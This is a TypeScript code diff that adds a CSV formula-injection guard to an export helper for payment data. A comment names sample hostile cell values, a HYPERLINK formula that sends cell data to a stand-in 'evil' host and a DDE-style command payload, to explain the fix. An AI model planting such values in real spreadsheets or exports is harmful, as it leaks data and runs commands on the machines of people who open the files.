@@ -10,7 +10,16 @@ export function filsToCsvAed(fils: number): string {
 
 export function csvField(value: string | number | null | undefined): string {
   if (value === null || value === undefined) return "";
-  const s = String(value);
+  let s = String(value);
+  // CSV formula-injection guard: Excel/Sheets execute a cell that begins with
+  // = + - @ (or a leading control char) as a formula, so a customer named
+  // `=HYPERLINK("http://evil"&A1)` or a payment reference like `=cmd|...` would
+  // run when the accountant opens an export. Neutralize by prefixing a single
+  // quote — but leave plain numeric money values (e.g. "-5.00" reversal rows
+  // from filsToCsvAed) alone so the column still parses as numbers.
+  if (/^[=+\-@\t\r]/.test(s) && !/^-?\d+(\.\d+)?$/.test(s)) {
+    s = "'" + s;
+  }
   return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
